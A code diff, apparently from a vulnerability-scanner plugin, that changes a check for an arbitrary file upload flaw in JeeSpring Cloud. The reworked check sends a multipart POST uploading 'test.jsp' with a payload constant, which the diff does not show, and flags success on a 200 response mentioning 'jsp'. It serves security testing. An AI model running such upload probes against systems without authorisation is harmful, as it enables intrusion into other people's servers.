@@ -38,38 +38,48 @@ HEADERS = {
 }
 
 
-def check(url, dns_domain="", proxies=None, session=None):
+def check(url, dns_domain="", proxies=None, session=None, timeout=TIMEOUT):
     """
-    检测 JeeSpringCloud 2023 任意文件上传漏洞
+    检测 JeeSpring Cloud 任意文件上传漏洞
     :param url: 目标 URL
-    :param dns_domain: DNS 日志域名（不需要使用，但为了保持接口一致性）
+    :param dns_domain: DNS 日志域名（不使用，仅保持接口一致性）
     :param proxies: 代理配置
     :param session: 复用的 Session 实例（可选）
+    :param timeout: 请求超时时间（秒）
     :return: 如果存在漏洞，返回 (True, 详细信息字典)，否则返回 (False, {})
     """
-    # 构建目标 URL
+    # 使用传入的 session，如果没有则创建新的 session
+    session = session or requests.Session()
+    
     target_url = urljoin(url, UPLOAD_PATH)
-
+    
     try:
-        # 使用传入的 session，如果没有则创建新的 session（用于单独测试时）
-        session = session or requests.Session()
-
-        # 发送文件上传请求
-        response = session.post(url=target_url, data=PAYLOAD, headers=HEADERS, timeout=TIMEOUT, verify=False,
-                                proxies=proxies)
+        # 准备上传文件
+        files = {
+            'file': ('test.jsp', PAYLOAD, 'application/octet-stream')
+        }
+        
+        # 发送 POST 请求进行文件上传
+        headers = HEADERS.copy()
+        headers.update({
+            'Accept': '*/*',
+            'X-Requested-With': 'XMLHttpRequest',
+        })
+        
+        res = session.post(target_url, headers=headers, files=files, timeout=timeout, verify=False, proxies=proxies)
 
         # 获取 HTTP 状态码并输出调试信息
-        code = response.status_code
-        logger.debug(Fore.CYAN + f"[{code}]" + Fore.BLUE + f"[{response.headers}]", extra={"target": target_url})
+        code = res.status_code
+        logger.debug(Fore.CYAN + f"[{code}]" + Fore.BLUE + f"[{res.headers}]", extra={"target": target_url})
 
         # 检查返回内容中是否包含文件上传成功的标志
-        if 'jsp' in response.text and code == 200:
+        if 'jsp' in res.text and code == 200:
             logger.info(Fore.RED + f"[{CVE_ID} vulnerability detected!]", extra={"target": target_url})
             return True, {
                 "CVE_ID": CVE_ID,
                 "URL": target_url,
                 "Details": f"{CVE_ID} vulnerability detected at {target_url}",
-                "ResponseSnippet": response.text[:200] + "...."  # 仅截取前200字符作为报告片段
+                "ResponseSnippet": res.text[:200] + "...."  # 仅截取前200字符作为报告片段
             }
 
         # 如果未检测到漏洞，返回 False
